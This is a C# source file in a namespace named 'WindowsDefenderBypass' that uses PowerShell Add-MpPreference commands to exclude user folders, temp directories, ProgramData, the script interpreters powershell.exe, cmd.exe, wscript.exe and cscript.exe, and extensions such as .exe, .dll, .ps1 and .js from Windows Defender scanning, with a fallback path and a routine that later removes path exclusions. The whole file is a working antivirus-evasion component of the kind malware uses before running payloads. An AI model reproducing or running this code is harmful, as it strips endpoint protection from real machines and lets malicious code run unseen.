using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace WindowsDefenderBypass
{
    public static class ExclusionManager
    {
        public static void AddCommonExclusions()
        {
            bool useRunspace = false;
            try
            {
                var testRunspace = RunspaceFactory.CreateRunspace();
                testRunspace.Dispose();
                useRunspace = true;
            }
            catch
            {
                useRunspace = false;
            }

            if (useRunspace)
            {
                try
                {
                    using (Runspace runspace = RunspaceFactory.CreateRunspace())
                    {
                        runspace.Open();
                        using (PowerShell ps = PowerShell.Create())
                        {
                            ps.Runspace = runspace;

                        string[] commonPaths = {
                            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                            Environment.GetFolderPath(Environment.SpecialFolder.Temp),
                            @"C:\Windows\Temp",
                            @"C:\ProgramData"
                        };

                        foreach (string path in commonPaths)
                        {
                            try
                            {
                                ExecutePowerShellCommand(ps, $"Add-MpPreference -ExclusionPath \"{path}\"");
                                Console.WriteLine($"  [+] Added exclusion: {path}");
                            }
                            catch
                            {
                            }
                        }

                        string[] processes = { "powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe" };
                        foreach (string proc in processes)
                        {
                            try
                            {
                                ExecutePowerShellCommand(ps, $"Add-MpPreference -ExclusionProcess \"{proc}\"");
                                Console.WriteLine($"  [+] Added process exclusion: {proc}");
                            }
                            catch
                            {
                            }
                        }

                        string[] extensions = { ".exe", ".dll", ".ps1", ".bat", ".cmd", ".vbs", ".js" };
                        foreach (string ext in extensions)
                        {
                            try
                            {
                                ExecutePowerShellCommand(ps, $"Add-MpPreference -ExclusionExtension \"{ext}\"");
                                Console.WriteLine($"  [+] Added extension exclusion: {ext}");
                            }
                            catch
                            {
                            }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"  [!] Error in PowerShell runspace: {ex.Message}");
                    AddExclusionsFallback();
                }
            }
            else
            {
                AddExclusionsFallback();
            }
        }

        private static void AddExclusionsFallback()
        {
            Console.WriteLine("  [*] Using fallback method for exclusions...");
            string[] commonPaths = {
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.Temp),
                @"C:\Windows\Temp",
                @"C:\ProgramData"
            };

            foreach (string path in commonPaths)
            {
                PowerShellHelper.RunPowerShellCommand($"Add-MpPreference -ExclusionPath \"{path}\"");
                Console.WriteLine($"  [+] Added exclusion: {path}");
            }

            string[] processes = { "powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe" };
            foreach (string proc in processes)
            {
                PowerShellHelper.RunPowerShellCommand($"Add-MpPreference -ExclusionProcess \"{proc}\"");
                Console.WriteLine($"  [+] Added process exclusion: {proc}");
            }

            string[] extensions = { ".exe", ".dll", ".ps1", ".bat", ".cmd", ".vbs", ".js" };
            foreach (string ext in extensions)
            {
                PowerShellHelper.RunPowerShellCommand($"Add-MpPreference -ExclusionExtension \"{ext}\"");
                Console.WriteLine($"  [+] Added extension exclusion: {ext}");
            }
        }

        private static void ExecutePowerShellCommand(PowerShell ps, string command)
        {
            ps.Commands.Clear();
            ps.AddScript(command);
            ps.Invoke();
        }

        public static void RemoveAllExclusions()
        {
            try
            {
                using (Runspace runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();
                    using (PowerShell ps = PowerShell.Create())
                    {
                        ps.Runspace = runspace;

                        ps.AddScript("Get-MpPreference | Select-Object -ExpandProperty ExclusionPath");
                        var paths = ps.Invoke();
                        ps.Commands.Clear();

                        foreach (var path in paths)
                        {
                            if (path != null)
                            {
                                ExecutePowerShellCommand(ps, $"Remove-MpPreference -ExclusionPath \"{path.ToString()}\"");
                            }
                        }

                        Console.WriteLine("  [+] Removed all path exclusions");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"  [!] Error removing exclusions: {ex.Message}");
            }
        }
    }
}
